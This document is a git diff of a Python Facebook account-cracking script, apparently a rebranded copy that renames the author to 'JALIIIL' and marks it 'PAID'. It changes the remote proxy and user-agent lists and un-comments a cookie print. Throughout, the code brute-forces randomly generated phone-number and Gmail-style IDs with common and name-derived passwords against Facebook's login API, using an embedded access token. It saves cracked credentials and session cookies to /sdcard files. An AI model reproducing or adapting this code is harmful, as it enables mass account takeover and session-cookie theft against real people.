@@ -11,13 +11,13 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python sajid.py')
+	os.system('python GJ.py')
 	
 print('[•] TOOL LOADING')
 
 
 try:
-	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
+	prox= requests.get('https://raw.githubusercontent.com/jalilha2/jalil/main/proxies.txt').text
 	open('proxies.txt','w').write(proxies)
 except Exception as e:
 	print('\x1b[1;95m[√] LOADING...')
@@ -27,14 +27,14 @@ proxies=open('proxies.txt','r').read().splitlines()
 
 android_models=[]
 try:
-	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
+	xx = requests.get('https://raw.githubusercontent.com/jalilha2/jalil/main/strings.txt').text.splitlines()
 	for line in xx:
 		android_models.append(line)
 except:pass
 
 usr=[]
 try:
-	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
+	xd=requests.get('https://raw.githubusercontent.com/jalilha2/jalil/main/ua.txt').text.splitlines()
 	for us in xd:
 		usr.append(us)
 except: pass
@@ -146,27 +146,43 @@ device = {
         'fbsv':fbsv,
         'fbca':fbca,
         'fbdm':fbdm}
+##______COLORS____ARE________######
+pwx=[]
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m'
+Y = '\033[93;1m'
+B = '\033[94;1m'
+P = '\033[95;1m'
+S = '\033[96;1m'
+N = '\x1b[0m'
+PURPLE ='\x1b[38;5;46m'
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+BLACK="\033[1;30m"
+EXTRA ='\x1b[38;5;208m'
+#________________________________________#
 
-logo=("""\033[1;91m
- \033[1;91m ╔═╗ ╔═╗ .----------------.  .----------------.  .----------------. 
- \033[1;91m | .--------------. || .--------------. || .--------------. |
-\033[1;91m   | |    _______   | || |              | || |      __      | |
-\033[1;91m   | |   /  ___  |  | || |              | || |     /  \     | |
- \033[1;91m  | |  |  (__ \_|  | || |              | || |    / /\ \    | |
-\033[1;91m   | |   '.___`-.   | || |              | || |   / ____ \   | |
-\033[1;91m   | |  |`\____) |  | || |              | || | _/ /    \ \_ | |
-\033[1;91m   | |  |_______.'  | || |   _______    | || ||____|  |____|| |
- \033[1;91m  | |              | || |  |_______|   | || |              | |
-\033[1;91m   | '--------------' || '--------------' || '--------------' |
- \033[1;91m  '----------------'  '----------------'  '----------------'
- \033[1;91m   -------------------------------
+logo=(f"""{WHITE}
+   oooo       .o.       ooooo        ooooo ooooo        
+   `888      .888.      `888'        `888' `888'        
+    888     .8"888.      888          888   888         
+    {GREEN}888    .8' `888.     888          888   888         
+    888   .88ooo8888.    888          888   888         
+    {YELLOW}888  .8'     `888.   888       o  888   888       o 
+.o. 88P o88o     o8888o o888ooooood8 o888o o888ooooood8 
+`Y888P                                      {GREEN}A {RED}L {WHITE}G
 \033[1;37m--------------------------------------------------
- [\033[1;32m*\033[1;37m] Author   : sajid_ktk
- [\033[1;32m*\033[1;37m] Facebook : sajid_ktk
- [\033[1;32m*\033[1;37m] Tool     : FREE
- [\033[1;32m*\033[1;37m] Version  : 0.0.9
+ [\033[1;32m*\033[1;37m] Author   : ITZJALIL0
+ [\033[1;32m*\033[1;37m] Facebook : H. M. JALIL
+ [\033[1;32m*\033[1;37m] Tool     : PAID
+ [\033[1;32m*\033[1;37m] Version  : 1.0.1
 \033[1;37m--------------------------------------------------
- [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/sajid-OK.txt\033[1;37m
+ [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/JALIIIL-OK.txt\033[1;37m
 \033[1;37m--------------------------------------------------""")
 def linex():
 	print('\033[1;37m--------------------------------------------------')
@@ -276,7 +292,7 @@ def menu():
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
 				input(' Press enter to back ')
-				os.system('python sajid.py')
+				os.system('python GJ.py')
 			elif xd in ['2','02']:
 				    pak() 
             
@@ -313,7 +329,7 @@ def pak():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
-		with tred(max_workers=30) as sajid:	
+		with tred(max_workers=30) as JALIIIL:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -325,7 +341,7 @@ def pak():
 				if pcs in ['1','01']:
 					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
 				if mthd in ['1','01']:
-					sajid.submit(sajid4,ids,passlist)
+					JALIIIL.submit(JALIIIL4,ids,passlist)
 					
 def ind():
 		user=[]
@@ -347,7 +363,7 @@ def ind():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
-		with tred(max_workers=30) as sajid:	
+		with tred(max_workers=30) as JALIIIL:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -359,7 +375,7 @@ def ind():
 				if pcs in ['1','01']:
 					passlist = [psx,ids,'57273200','59039200','57575751']
 				if mthd in ['1','01']:
-					sajid.submit(sajid4,ids,passlist)
+					JALIIIL.submit(JALIIIL4,ids,passlist)
 				
 		print('\033[1;37m')
 		linex()
@@ -367,7 +383,7 @@ def ind():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python sajid.py')
+		os.system('python GJ.py')
 
 def gmail():
 		os.system('rm -rf .re.txt')
@@ -408,7 +424,7 @@ def gmail():
 				mail = ''.join(random.choice(string.digits) for _ in range(4))
 				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 			fo = open('.re.txt', 'r').read().splitlines()
-		with tred(max_workers=30) as sajid:
+		with tred(max_workers=30) as JALIIIL:
 			total = str(len(fo))
 			clear()
 			print(' Total ids : \033[1;32m'+total+f' ')
@@ -432,7 +448,7 @@ def gmail():
 				else:
 					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
 				if mthd in ['1','01']:
-					sajid.submit(sajid4,ids,passlist)
+					JALIIIL.submit(JALIIIL4,ids,passlist)
 				
 		print('\033[1;37m')
 		linex()
@@ -440,13 +456,13 @@ def gmail():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python sajid.py')
+		os.system('python GJ.py')
 #b-api method
 #1method
 def api1(ids,names,passlist):
 		try:
 			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [sajid-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [JALIIIL-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			fn = names.split(' ')[0]
 			try:
 				ln = names.split(' ')[1]
@@ -511,18 +527,18 @@ def api1(ids,names,passlist):
 				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 				q = json.loads(po)
 				if 'session_key' in q:
-					print('\r\r\033[1;32m [sajid-OK] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/sajid-OK.txt','a').write(ids+'|'+pas+'\n')
+					print('\r\r\033[1;32m [JALIIIL-OK] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/JALIIIL-OK.txt','a').write(ids+'|'+pas+'\n')
 					oks.append(ids)
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [sajid-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/sajid-CP.txt','a').write(ids+'|'+pas+'\n')
+						print('\r\r\x1b[38;5;205m [JALIIIL-CP] '+ids+' | '+pas+'\033[1;97m')
+						open('/sdcard/JALIIIL-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
 					else:
-						open('/sdcard/sajid-CP.txt','a').write(ids+'|'+pas+'\n')
+						open('/sdcard/JALIIIL-CP.txt','a').write(ids+'|'+pas+'\n')
 						break
 				else:
 					continue
@@ -536,7 +552,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [sajid-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [JALIIIL-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -584,26 +600,26 @@ def api2(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [sajid-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [JALIIIL-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/sajid-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/sajid-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print("\r\r\033[1;33m Cookie: "+coki)
+                                        open('/sdcard/JALIIIL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/JALIIIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[sajid-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[JALIIIL-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [sajid-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/sajid-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [JALIIIL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/JALIIIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/sajid-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/JALIIIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -617,10 +633,10 @@ def api2(ids,names,passlist):
 
 
 #method4
-def sajid4(ids,passlist):
+def JALIIIL4(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [sajid-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [JALIIIL-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -689,11 +705,11 @@ def sajid4(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [sajid-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [JALIIIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
-                                        open('/sdcard/sajid-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/sajid-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/JALIIIL-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/JALIIIL-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -703,8 +719,8 @@ def sajid4(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\033[1;33m [sajid-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/sajid-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;33m [JALIIIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/JALIIIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
